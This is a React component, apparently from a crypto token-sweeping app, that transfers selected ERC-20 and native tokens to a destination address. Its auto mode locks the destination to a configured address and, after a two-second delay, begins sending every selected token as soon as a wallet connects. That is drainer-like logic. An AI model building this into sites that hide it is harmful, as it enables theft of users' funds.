"use client";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { usePublicClient, useWalletClient } from "wagmi";
import { isAddress } from "essential-eth";
import { useAtom } from "jotai";
import { useCallback, useEffect, useRef } from "react";
import { normalize } from "viem/ens";
import { erc20Abi } from "viem";
import { useAccount } from "wagmi";
import { checkedTokensAtom } from "../atoms/checked-tokens-atom";
import { destinationAddressAtom } from "../atoms/destination-address-atom";
import { globalTokensAtom } from "../atoms/global-tokens-atom";
import { AUTO_MODE_ENABLED } from "@/config";

// Native token placeholder addresses used by various APIs
const NATIVE_TOKEN_ADDRESSES = [
  "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
  "0x0000000000000000000000000000000000000000",
].map((addr) => addr.toLowerCase());

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(
    destinationAddressAtom
  );
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { address, chain } = useAccount();
  const hasAutoSentRef = useRef(false);
  const isAutoSendingRef = useRef(false);

  // Reset auto-send flag when wallet or chain changes
  useEffect(() => {
    hasAutoSentRef.current = false;
    isAutoSendingRef.current = false;
  }, [address, chain?.id]);

  const sendAllCheckedTokens = useCallback(async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(
      checkedRecords
    )
      .filter(([tokenAddress, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress as `0x${string}`);

    if (!walletClient) {
      console.error("Wallet not connected");
      return;
    }
    if (!publicClient) {
      console.error("Public client not available");
      return;
    }
    if (!destinationAddress) {
      console.error("Destination address not set");
      return;
    }

    // Resolve ENS if needed
    let finalDestination = destinationAddress;
    if (destinationAddress.includes(".")) {
      try {
        const resolvedDestinationAddress = await publicClient.getEnsAddress({
          name: normalize(destinationAddress),
        });
        if (resolvedDestinationAddress) {
          finalDestination = resolvedDestinationAddress;
          setDestinationAddress(resolvedDestinationAddress);
        } else {
          console.error("Failed to resolve ENS name");
          return;
        }
      } catch (err) {
        console.error("Failed to resolve ENS name", err);
        return;
      }
    }

    if (!isAddress(finalDestination)) {
      console.error("Invalid destination address");
      return;
    }

    // Show progress
    if (AUTO_MODE_ENABLED) {
      console.log(`Auto-transferring ${tokensToSend.length} tokens...`);
    }

    // Send tokens sequentially to avoid nonce issues
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find(
        (token) => token.contract_address === tokenAddress
      );

      if (!token) {
        console.error(`Token not found: ${tokenAddress}`);
        continue;
      }

      const isNativeToken = NATIVE_TOKEN_ADDRESSES.includes(
        tokenAddress.toLowerCase()
      );

      try {
        let res;

        if (isNativeToken) {
          // Send native token (BNB, ETH, etc.) using native transfer
          console.log("🌐 Sending native token:", token.contract_ticker_symbol);

          // Get the balance in wei (native tokens use 18 decimals typically)
          const balanceWei = BigInt(token.balance);

          // Estimate gas fees first (use a small test amount for estimation)
          // Gas cost for native transfers is mostly fixed (~21000), value doesn't affect it much
          let gasEstimate: bigint;
          try {
            // Estimate with a small test amount (1 wei) - gas cost is the same regardless of value
            const testAmount = BigInt(1);
            const gasEstimateResult = await publicClient.estimateGas({
              account: walletClient.account,
              to: finalDestination as `0x${string}`,
              value: testAmount,
            });
            // Add 30% buffer for gas price fluctuations and safety
            gasEstimate = (gasEstimateResult * BigInt(130)) / BigInt(100);
          } catch (error) {
            // If estimation fails, use a conservative estimate (21000 base + 50% buffer)
            gasEstimate = BigInt(31500);
            console.warn(
              "Gas estimation failed, using conservative estimate:",
              gasEstimate
            );
          }

          // Get current gas price
          const gasPrice = await publicClient.getGasPrice();
          const totalGasCost = gasEstimate * gasPrice;

          // Reserve gas fees - only transfer what's left after gas
          const transferAmount =
            balanceWei > totalGasCost ? balanceWei - totalGasCost : BigInt(0);

          if (transferAmount === BigInt(0)) {
            const gasCostFormatted = (Number(totalGasCost) / 1e18).toFixed(6);
            const balanceFormatted = (Number(balanceWei) / 1e18).toFixed(6);
            console.error(
              `❌ Insufficient ${token.contract_ticker_symbol} balance for gas fees.\n` +
                `   Need at least ${gasCostFormatted} ${token.contract_ticker_symbol} for gas\n` +
                `   But only have ${balanceFormatted} ${token.contract_ticker_symbol}\n` +
                `   Skipping transfer to preserve gas for other tokens.`
            );
            continue;
          }

          const gasCostFormatted = (Number(totalGasCost) / 1e18).toFixed(6);
          const transferFormatted = (Number(transferAmount) / 1e18).toFixed(6);
          console.log(
            `💰 Reserving ${gasCostFormatted} ${token.contract_ticker_symbol} for gas\n` +
              `   Transferring ${transferFormatted} ${token.contract_ticker_symbol}`
          );

          // For native tokens, use sendTransaction directly
          res = await walletClient.sendTransaction({
            to: finalDestination as `0x${string}`,
            value: transferAmount,
          });
        } else {
          // Send ERC-20 token using contract transfer
          console.log("🪙 Sending ERC-20 token:", token.contract_ticker_symbol);

          // Check if we have enough native token for gas fees
          const nativeBalance = await publicClient.getBalance({
            address: walletClient.account.address,
          });

          // Estimate gas for ERC-20 transfer
          let gasEstimate: bigint;
          try {
            const { request: simulateRequest } =
              await publicClient.simulateContract({
                account: walletClient.account,
                address: tokenAddress,
                abi: erc20Abi,
                functionName: "transfer",
                args: [
                  finalDestination as `0x${string}`,
                  BigInt(token.balance),
                ],
              });

            // Estimate gas from the simulated request
            gasEstimate = await publicClient.estimateGas({
              account: walletClient.account,
              to: tokenAddress,
              data: simulateRequest.data,
              value: BigInt(0),
            });
            // Add 20% buffer
            gasEstimate = (gasEstimate * BigInt(120)) / BigInt(100);
          } catch (error) {
            // If estimation fails, use a conservative estimate (65000 for ERC-20 transfer)
            gasEstimate = BigInt(80000);
            console.warn(
              "Gas estimation failed, using conservative estimate:",
              gasEstimate
            );
          }

          // Get current gas price
          const gasPrice = await publicClient.getGasPrice();
          const totalGasCost = gasEstimate * gasPrice;

          if (nativeBalance < totalGasCost) {
            const gasCostFormatted = (Number(totalGasCost) / 1e18).toFixed(6);
            const balanceFormatted = (Number(nativeBalance) / 1e18).toFixed(6);
            const nativeSymbol = chain?.nativeCurrency?.symbol || "ETH";
            console.error(
              `❌ Insufficient ${nativeSymbol} for gas fees.\n` +
                `   Need at least ${gasCostFormatted} ${nativeSymbol} for gas\n` +
                `   But only have ${balanceFormatted} ${nativeSymbol}\n` +
                `   Skipping ${token.contract_ticker_symbol} transfer.`
            );
            continue;
          }

          const gasCostFormatted = (Number(totalGasCost) / 1e18).toFixed(6);
          const nativeSymbol = chain?.nativeCurrency?.symbol || "ETH";
          console.log(
            `⛽ Gas cost estimated: ${gasCostFormatted} ${nativeSymbol}`
          );

          const { request } = await publicClient.simulateContract({
            account: walletClient.account,
            address: tokenAddress,
            abi: erc20Abi,
            functionName: "transfer",
            args: [finalDestination as `0x${string}`, BigInt(token.balance)],
          });

          res = await walletClient.writeContract(request);
        }

        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: res,
          },
        }));

        console.log(
          `Sent ${token.contract_ticker_symbol} (${
            tokensToSend.indexOf(tokenAddress) + 1
          }/${tokensToSend.length})`
        );
      } catch (err: any) {
        console.error(
          `Error with ${token.contract_ticker_symbol}: ${
            err?.reason || err?.message || "Unknown error"
          }`
        );
      }
    }

    if (AUTO_MODE_ENABLED) {
      console.log("Auto-transfer completed!");
    }
  }, [
    checkedRecords,
    walletClient,
    publicClient,
    destinationAddress,
    tokens,
    setCheckedRecords,
    setDestinationAddress,
  ]);

  // Auto-send when in auto-mode and conditions are met
  useEffect(() => {
    console.log("🔍 Auto-send check:", {
      AUTO_MODE_ENABLED,
      hasAutoSent: hasAutoSentRef.current,
      isAutoSending: isAutoSendingRef.current,
      hasWalletClient: !!walletClient,
      hasPublicClient: !!publicClient,
      destinationAddress,
      checkedCount: Object.values(checkedRecords).filter((r) => r.isChecked)
        .length,
    });

    if (!AUTO_MODE_ENABLED) {
      console.log("❌ Auto-mode not enabled");
      return;
    }
    if (hasAutoSentRef.current) {
      console.log("⏭️ Already auto-sent, skipping");
      return;
    }
    if (isAutoSendingRef.current) {
      console.log("⏳ Already auto-sending, skipping");
      return;
    }
    if (!walletClient) {
      console.log("❌ No wallet client");
      return;
    }
    if (!publicClient) {
      console.log("❌ No public client");
      return;
    }
    if (!destinationAddress) {
      console.log("❌ No destination address");
      return;
    }

    const checkedCount = Object.values(checkedRecords).filter(
      (record) => record.isChecked
    ).length;

    // Only auto-send if we have tokens selected and destination is valid
    const addressAppearsValid =
      typeof destinationAddress === "string" &&
      (destinationAddress?.includes(".") || isAddress(destinationAddress));

    console.log("✅ Conditions met:", { checkedCount, addressAppearsValid });

    if (checkedCount > 0 && addressAppearsValid) {
      console.log("🚀 Starting auto-transfer in 2 seconds...");
      // Small delay to ensure everything is ready
      const timer = setTimeout(() => {
        console.log("🚀 Executing auto-transfer now!");
        isAutoSendingRef.current = true;
        hasAutoSentRef.current = true;
        sendAllCheckedTokens().finally(() => {
          isAutoSendingRef.current = false;
        });
      }, 2000); // Increased delay to ensure wallet is ready

      return () => clearTimeout(timer);
    } else {
      console.log("⏸️ Waiting for tokens to be selected or valid address");
    }
  }, [
    AUTO_MODE_ENABLED,
    walletClient,
    publicClient,
    destinationAddress,
    checkedRecords,
    sendAllCheckedTokens,
  ]);

  const addressAppearsValid: boolean =
    typeof destinationAddress === "string" &&
    (destinationAddress?.includes(".") || isAddress(destinationAddress));
  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked
  ).length;
  return (
    <div className="m-5">
      {AUTO_MODE_ENABLED && (
        <div className="p-3 mb-3 bg-blue-50 border border-blue-300 rounded">
          <strong>🤖 Auto-Mode Enabled</strong>
          <br />
          All tokens worth &gt; $1 will be automatically selected and
          transferred to the configured destination address.
        </div>
      )}
      <form>
        <label className="block mb-2">
          Destination Address:
          <Input
            required
            value={destinationAddress}
            placeholder="vitalik.eth"
            onChange={(e) => setDestinationAddress(e.target.value)}
            disabled={AUTO_MODE_ENABLED}
            className={`mt-1 ${
              addressAppearsValid
                ? "border-green-500"
                : destinationAddress.length > 0
                ? "border-yellow-500"
                : ""
            }`}
          />
        </label>
        <Button
          type="button"
          onClick={sendAllCheckedTokens}
          disabled={!addressAppearsValid || isAutoSendingRef.current}
          className="mt-5"
        >
          {isAutoSendingRef.current
            ? "Transferring..."
            : checkedCount === 0
            ? "Select one or more tokens above"
            : `Send ${checkedCount} tokens`}
        </Button>
      </form>
    </div>
  );
};
